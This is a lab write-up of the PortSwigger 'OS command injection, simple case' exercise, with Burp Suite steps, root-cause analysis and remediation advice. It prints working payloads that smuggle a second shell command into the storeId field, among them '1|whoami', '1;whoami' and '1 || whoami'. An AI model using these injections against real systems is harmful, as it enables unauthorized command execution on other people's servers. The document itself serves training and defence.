# Lab 01 — OS Command Injection, Simple Case

## 1. Overview

| Field | Value |
|---|---|
| Vulnerability Class | OS Command Injection (In-band / Verbose) |
| CWE | CWE-78 |
| Difficulty | Apprentice |
| Source | PortSwigger Web Security Academy |
| Objective | Execute `whoami` and determine the name of the current OS user |

## 2. Summary

The lab's product stock checker builds a shell command from two user-supplied parameters, `productID` and `storeID`, and returns the raw output of that command directly in the HTTP response. Because neither parameter is validated or sanitised, an attacker can inject a shell metacharacter into `storeID` to chain an arbitrary command onto the legitimate one. Since the application reflects command output verbatim, this is a classic **in-band (verbose)** command injection.

## 3. Proof of Concept (PoC)

1. Browse the shop, select any product, and click **Check stock**.
2. In Burp Suite, capture the resulting `POST /product/stock` request in **Proxy → HTTP history** and send it to **Repeater**.
3. Modify the `storeID` parameter to inject a pipe followed by `whoami`:
   ```
   productId=1&storeId=1|whoami
   ```
4. Send the request and inspect the response body — the current user's name is reflected alongside the normal stock-check output.

## 4. Evidence

**Request (Repeater):**
```
POST /product/stock HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1|whoami
```

**Response (relevant excerpt):**
```
HTTP/2 200 OK
...
carlos
```

The lab is marked as solved once this response is observed.

## 5. Root Cause Analysis

**Attacker perspective:** The `storeID` value is concatenated, unvalidated, into a backend shell invocation of the form:
```
stockreport.pl <productId> <storeId>
```
Submitting `1|whoami` turns this into:
```
stockreport.pl 1 1|whoami
```
The shell runs `stockreport.pl 1 1`, pipes its (irrelevant) stdout into `whoami`, and `whoami` — ignoring stdin — simply prints the current user. Because the application echoes the command's full output back to the client, the injection is immediately visible.

**Defender perspective:** The backend trusts `storeID` as a trusted, purely numeric value but never enforces that assumption server-side. The pipe character `|` is passed straight through to the shell interpreter with no filtering.

**Alternative payloads that also solve this lab:**
- `1;whoami` — sequential separator (Unix)
- `1 & whoami &` — background execution
- `1 || whoami` — executes if the first command fails (e.g. with an invalid `storeId`)

## 6. Impact

An attacker can execute arbitrary commands as the web server's service account. This can lead to full server compromise, access to sensitive files, lateral movement to other backend systems, or use of the compromised host as a pivot point into the wider infrastructure.

## 7. Remediation

- Never build shell commands via string concatenation of user input.
- Call the stock-reporting functionality through a safe API (e.g. a language-level function/library call or a parameterised subprocess call that does not invoke a shell) instead of `exec`-style shell invocation.
- Validate `productId` and `storeId` server-side against an allowlist (e.g. `^[0-9]+$`) and reject anything that doesn't match before it reaches the system call.
- Run the web application under a least-privilege account so that even a successful injection has minimal blast radius.

## 8. References

- [PortSwigger — OS command injection, simple case](https://portswigger.net/web-security/os-command-injection)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
